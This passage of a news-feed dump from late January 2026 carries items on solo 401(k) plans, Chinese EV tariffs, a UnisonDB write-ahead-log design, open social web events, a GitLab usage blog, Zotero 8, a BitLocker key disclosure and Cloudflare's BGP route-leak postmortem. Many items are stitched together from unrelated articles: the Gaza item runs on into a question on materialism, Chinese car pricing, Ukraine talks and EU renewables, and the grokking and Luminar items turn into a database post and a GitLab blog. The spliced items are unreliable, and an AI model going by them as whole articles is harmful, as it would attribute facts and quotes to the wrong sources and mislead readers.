While they've existed for decades serving a workforce that often struggled to earn enough to max out those contributions, wealth planners like JPMorgan Chase & Co. and Betterment are now racing to tap into burgeoning demand from a newer, and wealthier cohort: Post-pandemic contractors and self-employed DIY savers looking to shelter more income, grow assets tax-deferred or tax-free, all with the click of a button. 

The pitch is simple: Because of a quirk in the tax code, self-employed workers effectively contribute twice to their 401(k)s -- once as an employee on their own behalf and then again as a business owner making matching contributions. The platforms take care of the paperwork and clients get institutional-level tax planning and investment flexibility. More than three-quarters of America's record 36 million small businesses now have just a single employee, the owner. Cerulli Associates projects that total 401(k) plans in the U.S. will surpass 1 million by 2030, and the fastest growth is expected in sub-$5 million "micro" accounts.]]></content:encoded></item><item><title>Gaza: Reality of life amid the ruins as people struggle to survive (dubbed)</title><link>https://www.channel4.com/news/gaza-reality-of-life-amid-the-ruins-as-people-struggle-to-survive-dubbed</link><author>Secunder Kermani</author><category>news</category><pubDate>Fri, 23 Jan 2026 20:00:53 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[Following the announcement of Donald Trump’s new Board of Peace, his son-in-law Jared Kushner presented a reimagined vision of Gaza, full of sleek high-rise blocks and beaches.Far from the reality for the two million people living there now sheltering in makeshift tents amid the ruins of their former homes.

Materialism is the theory that only the physical is real, such that consciousness must be entirely a product of the brain. Materialism is counting on neuroscience to explain consciousness eventually, though this expectation is challenged because mental states seem so radically distinct from brain states. What are the arguments for and against Materialism (like the ‘hard problem’?).

Beijing itself has started acknowledging the problem at home. Chinese regulators last week warned of "severe penalties" for automakers defying efforts to rationalize pricing in the country's car market, and earlier this month a government ministry urged battery makers to curtail expansion and cutthroat competition. 

The European Union imposed steep tariffs on Chinese EV imports in 2024 and is now considering replacing them with minimum import price agreements. Canada's Prime Minister Mark Carney last week decided to allow 49,000 Chinese EVs annually at a 6.1% tariff rate, removing a 100% surtax. Germany announced this week that its $3.5 billion EV subsidy program will be open to all manufacturers including Chinese brands. Germany's environment minister Carsten Schneider dismissed concerns during a January 19 press conference: "I cannot see any evidence of this postulated major influx of Chinese car manufacturers in Germany, either in the figures or on the roads."

It's the first time officials from Russia, Ukraine and the US are known to have met face-to-face for negotiations since Moscow's full-scale invasion of Ukraine. 
The talks are taking place after US envoy Steve Witkoff and Donald Trump's son-in-law Jared Kushner traveled to Moscow, where they spoke with Russian leader Vladimir Putin. A Kremlin official describedthose talks as useful. But Moscow has since repeated its demand that Ukraine hand over territory in the eastern Donbas region that's still controlled by Kyiv.

Semafor adds: The milestone was hit largely thanks to a rise in solar power, which generated a record 13% of electricity in the EU, according to Ember. Together, wind and solar hit 30% of EU electricity generation, edging out fossil fuels at 29%. 

The shift is especially important with the bloc's alternative to Russian LNG -- Washington -- becoming increasingly unreliable and willing to weaponize economic tools. The US Commerce Secretary threw shade at the bloc's renewable push during Davos, warning that China uses net zero goals to make allies "subservient" by controlling battery and critical mineral supply chains. 

Still, renewables now provide nearly half of EU power, with wind and solar outpacing all fossil sources in more than half of member countries. "The stakes of transitioning to clean energy are clearer than ever," the Ember report's author said.]]></content:encoded></item><item><title>[D] Is Grokking unique to transformers/attention?</title><link>https://www.reddit.com/r/MachineLearning/comments/1qkz5do/d_is_grokking_unique_to_transformersattention/</link><author>/u/Dependent-Shake3906</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 18:43:38 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[Is Grokking unique to attention mechanism, every time I’ve read up on it seems to suggest that’s it a product of attention and models that utilise it.

This limit exists for a purpose: it prevents a single request from overwhelming memory or stalling replication.Whether it’s the 512KB cap in Consul
or the 1.5MB default in etcd
, these boundaries are a survival mechanism. In a distributed cluster, every byte you write has to be replicated via protocols like Raft. If a single record is too large, it creates “head-of-line blocking”—the entire replication pipeline slows down just to move one massive object, potentially causing heartbeats to fail and nodes to drop out of the cluster.At UnisonDB, we respect these same limits to protect our own system health. We need to be even more cautious about this, as we are not just doing Raft replication for writes. We also have high-fanout ISR (in-sync-replica) based edge replicas, meaning a single write can propagate to many more nodes.Why ISR Edge Replication Changes the Stakes#In our environment, the “Hard Wall” isn’t just about protecting memory or Raft heartbeats within a small core cluster. It is about protecting the replication integrity and lag across a vast edge network.Heartbeat Fragility in Edge Environments: Edge networks often have variable latency and less reliable connections. If replication takes too long because of oversized records, the system might falsely flag an edge node as “out of sync,” triggering expensive and unnecessary full re-syncs, wasting bandwidth and compute.Memory Pressure on Constrained Edge Nodes: Unlike robust core cluster nodes, edge replicas frequently run on more resource-constrained hardware. Pushing a 20MB block in a single request could easily cause an Out Of Memory (OOM) event on a smaller edge instance, leading to outages at the edge.But even with these constraints, we also understand that the need for large Key-Value storage hasn’t gone away—it has actually intensified. As an Edge-replicated, general-purpose Multi-Modal database, we see this constantly. Whether it’s a massive JSON configuration or high-dimensional vectors for AI use cases, modern data frequently pushes past those old boundaries.This size pressure usually shows up in two ways:: A single transaction involving multiple Key-Value pairs that, when grouped together, exceed the 1MB limit.: A single row containing hundreds of columns where the aggregate size of the update blows past the ceiling.In both cases, the user will expects the same ironclad KV guarantees they get with a tiny 1KB write. You shouldn’t have to sacrifice Atomicity just because your data model is complex.Why Manual Chunking Fails#When engineers hit a size limit, the instinctive reaction is to “chunk” the data by splitting a 10MB write into ten separate 1MB requests. This is where things get dangerous. Without a specialized architecture, you lose the atomicity promise. If your connection drops after chunk seven, the database is left in a “zombie” state. You have a partial update that is neither the old version nor the new one. In a real database, the rule is absolute: it must be all or nothing.Unisondb Solution: A WAL That Remembers Its Past#To solve this at UnisonDB, we stopped looking at the Write-Ahead Log (WAL) just as a flat, sequential file. Instead, we treated it as a backward-linked list.By adding a simple breadcrumb—a PrevTxnWalIndex—to every WAL record that are part of the same transaction, each chunk of data points back to the one that came before it. This allows us to stitch a single, massive transaction together across multiple physical writes without ever sending a request that exceeds the safety limit.This logic is the backbone of how we handle large multi-modal data. The lifecycle of a transaction in our dbkernel looks like this:: We write an anchor record to the WAL. This initializes the transaction and generates a unique ID.: As you stream your data chunks, each one links back to the previous disk offset. Even if you send 50 chunks to stay under the limit, the database knows they belong to one chain.: This is the atomic switch. The final record acts as the seal.Nothing becomes visible to you the user until that COMMIT record is successfully flushed to disk. If the stream breaks halfway through, the database simply ignores those dangling fragments during the next recovery scan.The engine needs to know exactly where the previous piece of the puzzle lives on disk. We use physical disk offsets to create this chain.Here is how this looks inside the UnisonDB transaction engine. Notice how we track the prevOffset to build the link on the fly. In the AppendKVTxn function, we take the current prevOffset and bake it into the new log record before appending it to the WAL.When  happens, the Commit function writes the final link. Only after the WAL confirms the commit do we flush the data to the in-memory MemTable.When UnisonDB reboots after a crash, the recovery process starts from the last known checkpoint. As the engine scans the log forward from that point, it looks specifically for COMMIT records. Because our transaction chunks are chained together using physical disk offsets, the engine has a clear map to follow.When a commit record is encountered, the engine uses the PrevTxnWalIndex to walk the chain of that specific transaction. It jumps from the commit record to the previous data chunk, and then to the one before that, continuing until it reaches the BEGIN record. This allows the engine to gather all the related pieces of a large Key-Value pair, Wide-Column row, or LOB without having to inspect unrelated transaction data that might be sitting in between those chunks.Reconstructing the Value#The GetTransactionRecords function is what performs this backward walk. It takes the offset of the commit record and follows the trail until the chain is complete.By chaining the records this way, we ensure that a large value is only rebuilt if the final commit record exists. If the engine finds chunks that don’t lead to a commit, it simply ignores them. This keeps the data consistent and ensures that the all or nothing promise is maintained for every data model we support.Building a database is often a game of trade-offs. You want system stability, but you also want to support modern, heavy workloads like AI and complex multi-modal schemas.By treating the Write-Ahead Log as a linked list, we found a way to have both. We keep our network requests small and safe, but we allow our data to be as large as it needs to be.Whether it is a simple Key-Value pair, a massive Wide-Column row, or a Large Object, the atomicity promise remains unbroken.If you found this article helpful, or if you’re interested in the future of edge-replicated data, we’d love your support.]]></content:encoded></item><item><title>Got Ideas For Growing The Open Social Web? Bring Them.</title><link>https://www.techdirt.com/2026/01/23/got-ideas-for-growing-the-open-social-web-bring-them/</link><author>Mike Masnick</author><category>tech</category><pubDate>Fri, 23 Jan 2026 18:35:04 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[For over three years now, since Elon Musk decided to spend $44 billion turning Twitter into his personal playground, we’ve been watching the open social web slowly, sometimes painfully, come into its own. Bluesky. Mastodon. The broader ATmosphere and fediverse along with a few other experiments (nostr! farcaster!). These aren’t just tech experiments anymore—they’re real alternatives that millions of people use every day.While these open social systems are working, and working well, tons of people are still choosing to stay in closed, proprietary, billionaire-controlled systems, where they have no control, no say in how they work, and no real agency. We’ve heard various excuses. We’ve heard about the pull of inertia. We’ve even heard the complaints that people haven’t found communities they like… or that they actively dislike some of the communities that have formed.So instead of just writing another post about why that matters (I’ve written plenty), Johannes Ernst from FediForum and I are doing something about it. On , we’re hosting an online “un-workshop” focused on one question: how do we actually grow the open social web even more?And, yes, I’m on the board of Bluesky, but this isn’t Bluesky specific. We want an open discussion and brainstorming on growing the wider open social web.This isn’t your standard conference where you sit through presentations and nod politely. It’s a participatory event built around the FediForum unconference model, though modified to be more of an ongoing brainstorming workshop (not unlike the Greenhouse events we’ve run here in the past).Before the event, participants can submit short position papers—your experiences, your ideas, your proposals for what might actually work to engage more people on open social systems. We’ll cluster those into topics and spend the actual event  them and brainstorming around them, not just listening to people talk at you.Here’s the thing: we want people who have real ideas and experience. People who have tried (and maybe failed) to get their friends onto the open social web and learned something useful from it. People who  had success convincing entire communities. People running organizations who are trying to figure out how to make the jump. Builders who want more users. Advocates who have done actual research with actual humans about what’s working and what isn’t.What we don’t need are more cynical hot takes about why the open social web will never work. If you’ve already decided it’s a lost cause, this isn’t the event for you. Go post about it on Threads or whatever. We also don’t need hot takes about how you’re glad most people don’t use the open social web. That’s great for you open social hipsters, but some of us think it’s important to get more people to recognize the power of open social.So, for everyone else—the people who believe this matters and want to figure out how to make it happen—we want to hear from you.The event will run from 8am to noon Pacific (which means Europeans can actually attend without setting an alarm for 3am), and registration is open now. The event will be run online, using Remo, a tool we’ve used in the past for online events, that is conducive to small group discussions and brainstorming.Position paper submissions are due by February 16th, and while they’re not required, they’re strongly encouraged (you can submit them during the registration process). The whole point is to come prepared to engage, not just spectate.Look, I’ve been writing about the importance of protocols over platforms for years now. The open social web represents one of the few genuine shots we have at building online spaces that aren’t controlled by a handful of companies (or their billionaire owners) making decisions based on whatever serves their interests that week. But potential doesn’t matter if we can’t translate it into much wider adoption.So if you’ve got ideas—real ideas, not just complaints—about how to get there, come share them.]]></content:encoded></item><item><title>Daily Deal: Luminar Mobile for iOS And Android</title><link>https://www.techdirt.com/2026/01/23/daily-deal-luminar-mobile-for-ios-and-android/</link><author>Daily Deal</author><category>tech</category><pubDate>Fri, 23 Jan 2026 18:30:04 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Luminar Mobile is your all-in-one creative companion designed for iOS, Android OS, and Chrome OS.

I just started using it at some point and never had a reason to switch.Back when GitHub still charged for private repositories, GitLab offered them for free. That was the initial hook. I had a bunch of small projects and experiments that I didn’t want to publish but also didn’t want to pay for. GitLab was the obvious choice.GitHub eventually made private repos free too, but by then my workflow was already built around GitLab. All my CI pipelines, Docker images, deployment scripts - everything pointed there.The Docker registry thingEvery GitLab project comes with a Container Registry. This is probably the feature I use most.The workflow is simple. Build an image locally or in CI, push it to the registry, pull it wherever you need it.No separate Docker Hub account. No thinking about pull rate limits (remember when Docker Hub introduced those and broke half the internet’s CI pipelines?). No managing access tokens for yet another service.For my private projects this is perfect. I don’t need the discoverability of Docker Hub. I just need a place to store images that integrates with my existing authentication.The 10GB limit per project sounds small on paper but I’ve never come close to hitting it. Old tags get cleaned up, base layers are shared, and most of my images aren’t that big anyway.GitLab CI was one of the earlier “CI config as code” implementations that I used. You drop a  in your repo and things start happening. The config is versioned with everything else, which means you can see exactly what your pipeline looked like six months ago.Nothing fancy. Build the image, push it, optionally deploy. The manual trigger on deploy is nice - I can build automatically but still control when things go to production.The shared runners GitLab provides handle most of my workloads. They’re not fast, but they’re free and reliable. For the times when I needed something specific - like a runner with more memory or access to my private network - setting up my own runner on a cheap VPS was straightforward. Install the runner, register it with a token, done.The documentation for CI/CD is extensive. Almost too extensive. There are so many features and options that finding what you need can take a while. But once you figure out your patterns, you mostly copy-paste from your own previous configs.Let’s talk about what’s not great. The GitLab web interface has always felt sluggish to me. Click on a merge request, wait. Switch to the pipeline view, wait. Open the job log, wait. It’s not terrible, but there’s this constant friction that adds up over a long session.I’ve noticed improvements recently. Either they optimized things or I’ve just gotten used to it - hard to say. But it’s still not as snappy as GitHub. GitLab tries to be everything. Issue tracking, project management, wiki, snippets, package registry, container registry, security scanning, infrastructure management, monitoring… The sidebar menu goes on forever.I use maybe 10% of what’s available. Repositories, merge requests, CI/CD, container registry. That’s pretty much it.This is a double-edged sword. On one hand, feature bloat. On the other, if I ever need something like a private NPM registry or security scanning, it’s already there. I just haven’t needed it yet.I run about a dozen private projects ranging from active side projects to abandoned experiments I keep around “just in case.” None of this costs me anything. It’s crazy.All my private projects live on GitLab. Prototypes, experiments, half-finished ideas, things I’m actively working on but not ready to share. It’s my digital workshop where I can make a mess without anyone watching.GitHub is different. That’s where I put things I want people to see.This split works well for me. I get the collaboration and visibility benefits of GitHub for public stuff while keeping my private mess organized on GitLab with proper CI/CD and container registries.Some people do everything on GitHub. Some do everything on GitLab. Having a foot in both camps might seem redundant but honestly, they serve different purposes in my workflow.]]></content:encoded></item><item><title>New YC homepage</title><link>https://www.ycombinator.com/</link><author>sarreph</author><category>hn</category><pubDate>Fri, 23 Jan 2026 18:08:11 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Zotero 8</title><link>https://www.zotero.org/blog/zotero-8/</link><author>bouchard</author><category>hn</category><pubDate>Fri, 23 Jan 2026 18:05:08 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[We’re excited to announce our latest major release, Zotero 8. Zotero 8 builds on the new design and features of Zotero 7 and includes a huge number of improvements and refinements.Redesigned Citation DialogZotero 8 introduces a new unified citation dialog, replacing the previous citation dialog (the “red bar”), the “classic” citation dialog, and the Add Note dialog (the “yellow bar”).The new dialog has two modes: List mode and Library mode. List mode lets you quickly search for citations from across your Zotero libraries by title, creator, and year. Library mode includes a library browser, letting you find items in specific libraries or collections. You can switch between the two modes with a single click, preserving any added items or entered search terms. By default, it will open in the last mode you used, but you can choose a different default mode in the settings.In Zotero 7, we added the ability to quickly add citations for selected items and open documents. In the new dialog, these options are available in both List mode and Library mode, so you can make these quick selections even if you otherwise prefer to add items via the library browser.As before, once you’ve selected an item, you can click on its bubble to customize the citation with a page number, prefix, etc. It’s also now possible to add any locator — not just a page number — right from the search bar by typing the full or short name (e.g., “line 10” or “l. 10” after the citation and pressing Enter/Return.You can switch between adding citations and adding notes using buttons in the bottom left, corresponding to the Add/Edit Citation and Add Note buttons in your word processor.(For those coming from the classic dialog, note that there’s no text field to make manual edits to citations. It’s been possible to edit citations directly in the document for many years, which is why the red bar didn’t include such a text field either. More importantly, though, such manual edits should be avoided in almost all cases. Instead, customize the citation via the citation dialog, which will allow Zotero to continue to update the citation as necessary.)Annotations in the Items ListAnnotations you make on PDFs, EPUBs, and webpage snapshots now show up under their parent attachments in the items list.Showing annotations in the items list makes it easier to view annotations across a library or collection, and it also makes it possible to search for annotations directly. For example, you can search for all annotations in a collection with a given tag and then create a note from those annotations or copy them to an external text editor with Quick Copy.In Advanced Search, you can use “Item Type” “is” “Annotation” to match annotations or use the Annotation Text and Annotation Comment search conditions to search for specific parts of the annotation.You can assign tags to selected annotations by dragging them to the tag selector, just like other items.Selected annotations show up in the item pane, grouped by top-level item.Reader Appearance Panel with Theme SupportWe’ve added a new Appearance panel in the reader that provides quick access to view settings and introduces support for reader themes.The view settings are per-document settings. Themes are applied globally for all documents, including in the attachment preview in the item pane, and apply to PDFs, EPUBs, and webpage snapshots.We offer a number of built-in themes (“Dark”, “Snow”, “Sepia”), and you can create custom themes just by specifying a foreground and background color. (Some other theme engines require additional accent colors, but we’ve tried to make this as simple as possible for users by automatically adjusting other colors based on the foreground and background colors.) You can set a different theme that applies to light mode and dark mode.The themes replace the previous on-by-default “Use Dark Mode for Content” option, which inverted images in dark mode. We’re now simply darkening images a bit when using a dark theme. Images and ink annotations in the reader sidebar and note editor are now only darkened as well (and only when Zotero itself is in dark mode).When possible, we also try to apply themes to PDF pages containing full-page images, such as scanned papers, by replacing whitish/dark colors with theme colors. (Otherwise we simply darken the page slightly.)It’s now possible to open notes in tabs in addition to separate windows. Note tabs fill the whole window, with wide margins for better readability and a clean, distraction-free space for note-taking.By default, double-clicking a note in the items list will open it in a tab. You can choose to open the note in the other space from the context menu, and you can change the default behavior using the “Open notes in new windows instead of tabs” setting in the General pane of the settings.Notes in tabs have a separate font size setting in the View menu.Reading Mode for Webpage SnapshotsReading Mode reformats webpage snapshots for easier reading, with unnecessary page elements removed. You can adjust line height and other view options from the Appearance panel.We’ve reworked the tabs menu to make it faster to interact with via the keyboard.You can now press Ctrl/Cmd-; to bring up the menu at any time.Once the menu is open, it simultaneously accepts search input, up/down navigation, and row selection, without the need to move between different parts of the menu. You can simply start typing the name of an open tab and then press Enter/Return to switch to it once you’ve narrowed down the list.It’s also possible to quickly close multiple tabs by moving between the row close buttons with up/down and pressing space bar to close a tab.Zotero now automatically keeps attachment filenames in sync with parent item metadata as you make changes (e.g., changing the title). In previous versions, while Zotero would automatically rename files when you first added them to your library, if you later edited the item’s metadata, you would need to right-click on the attachment and select “Rename File from Parent Metadata”.You can configure which file types renaming applies to from the General tab of the Zotero settings.After upgrading to this version, existing eligible files that don’t match the current filename format won’t be automatically renamed, but you can choose to rename them en masse from the Zotero settings. Zotero will also prompt you to rename all files if you change the filename format.“Rename File from Parent Metadata” has been removed from the item context menu. If a filename doesn’t match the configured filename format (e.g., because automatic renaming is disabled or you changed the format but didn’t choose to rename all files), you can click the “Rename File to Match Parent Item” button next to the filename in the attachment’s item pane to rename it.New Attachment Title OptionsZotero 7 introduced more consistent handling of attachment titles, preserving simpler, less-redundant titles (e.g., “Full Text PDF” or “Preprint PDF”) in cases where the title was previously changed to match the filename. Zotero 8 further refines its renaming and titling logic when adding multiple and/or non-primary attachments, to bring the functionality better in line with the intended behavior.We’ve also added a “Normalize Attachment Titles” option under Tools → Manage Attachments to update old primary attachments with titles matching the filename to use simpler titles such as “PDF”.While we recommend the default behavior, allowing Zotero to rename primary files and keep them renamed while using simpler titles in the items list, if you really prefer to view filenames instead of titles, you can now enable “Show attachment filenames in the items list” option in the General pane of the settings.Zotero 8 adds a version for Linux running on ARM64 devices. This includes ARM-based Chromebooks, Apple Silicon Macs running Linux (Linux VMs, Asahi Linux), and Raspberry Pis.If you’ve been unable to run Zotero on your ARM-based device, or you’ve been running the x86_64 version under emulation, give it a try.User Interface ImprovementsWe’ve made a number of changes across the interface to address common requests:A new button in the library tab allows you to quickly close the item pane without dragging its edge or using the menus.You can reorder item pane sections by dragging their icons in the side navigation bar.You can drag items, collections, and searches into the trash.You can drag attachments, notes, and related items from the item pane (e.g., to copy files to the filesystem or use Quick Copy).Collections automatically expand when you drag over them, making it easier to drop collections or items into subcollections.You can delete attachments from the item pane.Tabs maintain their size as you close them for faster closing of multiple tabs.With Zotero 8, the Zotero Connector save popup can autocomplete tags in your Zotero library and allows you to add a note to items as you save them.Zotero 8 includes much more than we can list here. See the changelog for additional details.If you’re already running Zotero, you can upgrade from within Zotero by going to Help → “Check for Updates…”.

From a report: Authorities in Hawaii announced this week that Dallas Pokornik, 33, had been charged with wire fraud after he allegedly fooled three major US carriers into giving him free tickets over a span of four years. 

Airlines typically offer standby tickets to their own staff and those with rival airlines as a way of ensuring the broader industry can effectively move employees across continents. According to court documents, Pokornik was a flight attendant for a Toronto-based airline from 2017 to 2019, but then used an employee identification from that carrier to obtain tickets, "which he in fact knew to be fraudulent at the time it was so presented." 

The only Toronto-based airline, Porter, told reporters it was "unable to verify any information related to this story." On one occasion, Pokornik is alleged to have requested a jumpseat in an aircraft's cockpit, which are normally reserved for off-duty pilots, even though he was not a pilot and did not have an airman's certificate. Federal rules prohibit the cockpit jumpseats from being used for leisure travel.]]></content:encoded></item><item><title>A Playground for AI/ML Engineers</title><link>https://podcasters.spotify.com/pod/show/mlops/episodes/A-Playground-for-AIML-Engineers-e3e2qam</link><author>Demetrios</author><category>podcast</category><enclosure url="https://anchor.fm/s/174cb1b8/podcast/play/114435862/https%3A%2F%2Fd3ctxlq1ktw2nl.cloudfront.net%2Fstaging%2F2026-0-23%2F416681357-44100-2-4e1efed8e8014.mp3" length="" type=""/><pubDate>Fri, 23 Jan 2026 17:59:53 +0000</pubDate><source url="https://mlops.community/">Podcast - MLOps</source><content:encoded><![CDATA[ is the Principal Data Scientist for Generative AI Products at Hotmart, working on AI-powered creator and learning experiences, including intelligent tutoring, content automation, and multilingual localization at scale.Join us at Coding Agents: The AI Driven Developer Conference - https://luma.com/codingagents“Agent as a product” sounds like hype, until Hotmart turns creators’ content into AI businesses that actually work.Paulo Vasconcellos is the Principal Data Scientist for Generative AI Products at Hotmart, where he leads efforts in applied AI, machine learning, and generative technologies to power intelligent experiences for creators and learners.

This type of technology should prevent anyone except the device owner from accessing the data if the computer is locked and powered off. But, by default, BitLocker recovery keys are uploaded to Microsoft’s cloud, allowing the tech giant — and by extension law enforcement — to access them and use them to decrypt drives encrypted with BitLocker, as with the case reported by Forbes.The case involved several people suspected of fraud related to the Pandemic Unemployment Assistance program in Guam, a U.S. island in the Pacific. Local news outlet Pacific Daily News covered the case last year, reporting that a warrant had been served to Microsoft in relation to the suspects’ hard drives. Kandit News, another local Guam news outlet, also reported in October that the FBI requested the warrant six months after seizing the three laptops encrypted with BitLocker. A spokesperson for Microsoft did not immediately respond to a request for comment by TechCrunch. Microsoft told Forbes that the company sometimes provides BitLocker recovery keys to authorities, having received an average of 20 such requests per year. Apart from the privacy risks of handing recovery keys to a company, Johns Hopkins professor and cryptography expert Matthew Green raised the potential scenario where malicious hackers compromise Microsoft’s cloud infrastructure — something that has happenedseveral times in recent years — and get access to these recovery keys. The hackers would still need physical access to the hard drives to use the stolen recovery keys.“It’s 2026 and these concerns have been known for years,” Green wrote in a post on Bluesky. “Microsoft’s inability to secure critical customer keys is starting to make it an outlier from the rest of the industry.”]]></content:encoded></item><item><title>Proof of Corn</title><link>https://proofofcorn.com/</link><author>rocauc</author><category>hn</category><pubDate>Fri, 23 Jan 2026 17:56:31 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[A project by@seth, inspired by@fredwilson, orchestrated by Claude Code (Opus 4.5)]]></content:encoded></item><item><title>Route leak incident on January 22, 2026</title><link>https://blog.cloudflare.com/route-leak-incident-january-22-2026/</link><author>nomaxx117</author><category>hn</category><pubDate>Fri, 23 Jan 2026 17:54:45 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[On January 22, 2026, an automated routing policy configuration error caused us to leak some Border Gateway Protocol (BGP) prefixes unintentionally from a router at our data center in Miami, Florida. While the route leak caused some impact to Cloudflare customers, multiple external parties were also affected because their traffic was accidentally funnelled through our Miami data center location.The route leak lasted 25 minutes, causing congestion on some of our backbone infrastructure in Miami, elevated loss for some Cloudflare customer traffic, and higher latency for traffic across these links. Additionally, some traffic was discarded by firewall filters on our routers that are designed to only accept traffic for Cloudflare services and our customers.While we’ve written about route leaks before, we rarely find ourselves causing them. This route leak was the result of an accidental misconfiguration on a router in Cloudflare’s network, and only affected IPv6 traffic. We sincerely apologize to the users, customers, and networks we impacted yesterday as a result of this BGP route leak.Essentially, a route leak occurs when a network tells the broader Internet to send it traffic that it's not supposed to forward. Technically, a route leak occurs when a network, or Autonomous System (AS), appears unexpectedly in an AS path. An AS path is what BGP uses to determine the path across the Internet to a final destination. An example of an anomalous AS path indicative of a route leak would be finding a network sending routes received from a peer to a provider.During this type of route leak, the rules of  are violated, as BGP updates are sent from AS64501 to their peer (AS64502), and then unexpectedly up to a provider (AS64503). Oftentimes the leaker, in this case AS64502, is not prepared to handle the amount of traffic they are going to receive and may not even have firewall filters configured to accept all of the traffic coming in their direction. In simple terms, once a route update is sent to a peer or provider, it should only be sent further to customers and not to another peer or provider AS.During the incident on January 22, we caused a similar kind of route leak, in which we took routes from some of our peers and redistributed them in Miami to some of our peers and providers. According to the route leak definitions in RFC7908, we caused a mixture of Type 3 and Type 4 route leaks on the Internet. A change that ultimately triggers the routing policy bug is merged in our network automation code repositoryAutomation is run on single Miami edge-router resulting in unexpected advertisements to BGP transit providers and peersNetwork team begins investigating unintended route advertisements from MiamiIncident is raised to coordinate responseThe bad configuration change is manually reverted by a network operator, and automation is paused for the router, so it cannot run againThe change that triggered the leak is reverted from our code repositoryAutomation is confirmed by operators to be healthy to run again on the Miami router, without the routing policy bugAutomation is unpaused on the single router in MiamiWhat happened: the configuration errorOn January 22, 2026, at 20:25 UTC, we pushed a change via our policy automation platform to remove the BGP announcements from Miami for one of our data centers in Bogotá, Colombia. This was purposeful, as we previously forwarded some IPv6 traffic through Miami toward the Bogotá data center, but recent infrastructure upgrades removed the need for us to do so.This change generated the following diff (a program that compares configuration files in order to determine how or whether they differ):[edit policy-options policy-statement 6-COGENT-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]

[edit policy-options policy-statement 6-TELIA-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;While this policy change looks innocent at a glance, only removing the prefix lists containing BOG04 unicast prefixes resulted in a policy that was too permissive:policy-options policy-statement 6-TELIA-ACCEPT-EXPORT {
    term ADV-SITELOCAL-GRE-RECEIVER {
        from route-type internal;
        then {
            community add STATIC-ROUTE;
            community add SITE-LOCAL-ROUTE;
            community add MIA01;
            community add NORTH-AMERICA;
            accept;
        }
    }
}
The policy would now mark every prefix of type “internal” as acceptable, and proceed to add some informative communities to all matching prefixes. But more importantly, the policy also accepted the route through the policy filter, which resulted in the prefix — which was intended to be “internal” —  being advertised externally. This is an issue because the “route-type internal” match in JunOS or JunOS EVO (the operating systems used by  devices) will match any non-external route type, such as Internal BGP (IBGP) routes, which is what happened here.As a result, all IPv6 prefixes that Cloudflare redistributes internally across the backbone were accepted by this policy, and advertised to all our BGP neighbors in Miami. This is unfortunately very similar to the outage we experienced in 2020, on which you can read more .When the policy misconfiguration was applied at 20:25 UTC, a series of unintended BGP updates were sent from AS13335 to peers and providers in Miami. These BGP updates are viewable historically by looking at MRT files with the  tool or using . ➜  ~ monocle search --start-ts 2026-01-22T20:24:00Z --end-ts 2026-01-22T20:30:00Z --as-path ".*13335[ \d$]32934$*"

In the monocle output seen above, we have the timestamp of our BGP update, followed by the next-hop in the announcement, the ASN of the network feeding a given route-collector, the prefix involved, and the AS path and BGP communities if any are found. At the end of the output per-line, we also find the route-collector instance.Looking at the first update for prefix 2a03:2880:f077::/48, the AS path is 64112 22850 174 3356 13335 32934. This means we (AS13335) took the prefix received from Meta (AS32934), our peer, and then advertised it toward Lumen (AS3356), one of our upstream transit providers. We know this is a route leak as routes received from peers are only meant to be readvertised to downstream (customer) networks, not laterally to other peers or up to providers.As a result of the leak and the forwarding of unintended traffic into our Miami router from providers and peers, we experienced congestion on our backbone between Miami and Atlanta, as you can see in the graph below. This would have resulted in elevated loss for some Cloudflare customer traffic, and higher latency than usual for traffic traversing these links. In addition to this congestion, the networks whose prefixes we leaked would have had their traffic discarded by firewall filters on our routers that are designed to only accept traffic for Cloudflare services and our customers. At peak, we discarded around 12Gbps of traffic ingressing our router in Miami for these non-downstream prefixes. Follow-ups and preventing route leaks We are big supporters and active contributors to efforts within the  and  that strengthen routing security. We know firsthand how easy it is to cause a route leak accidentally, as evidenced by this incident. Preventing route leaks will require a multi-faceted approach, but we have identified multiple areas in which we can improve, both short- and long-term.In terms of our routing policy configurations and automation, we are:Patching the failure in our routing policy automation that caused the route leak, and will mitigate this potential failure and others like it immediately Implementing additional BGP community-based safeguards in our routing policies that explicitly reject routes that were received from providers and peers on external export policies Adding automatic routing policy evaluation into our CI/CD pipelines that looks specifically for empty or erroneous policy terms Improve early detection of issues with network configurations and the negative effects of an automated changeTo help prevent route leaks in general, we are: Validating routing equipment vendors' implementation of  (BGP roles and the Only-to-Customer Attribute) in preparation for our rollout of the feature, which is the only way independent of routing policy to prevent route leaks caused at the  Autonomous System (AS)Most importantly, we would again like to apologize for the impact we caused users and customers of Cloudflare, as well as any impact felt by external networks.]]></content:encoded></item><item><title>Shaping Global Travel: Leadership, Innovation and Sustainable Growth | Highlight</title><link>https://www.youtube.com/watch?v=Hsu_LbB45DU</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/Hsu_LbB45DU?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 17:54:26 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[Tourism took centre stage in Davos this week as political leaders, investors and industry executives gathered for an executive panel discussion organised by Euronews Travel.

